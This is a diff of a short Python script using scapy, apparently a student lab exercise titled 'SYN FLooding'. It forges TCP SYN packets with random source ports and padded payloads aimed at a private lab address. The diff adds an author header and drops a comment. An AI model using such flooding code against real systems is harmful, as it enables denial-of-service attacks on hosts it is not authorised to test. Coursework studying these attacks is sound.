@@ -1,3 +1,10 @@
+"""
+Luyckx Marco 496283
+Bouhnine Ayoub 500048
+
+SYN FLooding
+"""
+
 from scapy.all import *
 
 target_ip = "10.12.0.10"
@@ -9,7 +16,7 @@ ip = IP(dst=target_ip)
 
 tcp = TCP(sport=RandShort(), dport=target_port, flags="S") # the flag "S" indicates the type SYN
 
-raw = Raw(b"A"*1024) # adding some data
+raw = Raw(b"A"*1024)
 
 # forge the packet
 packet = ip / tcp / raw
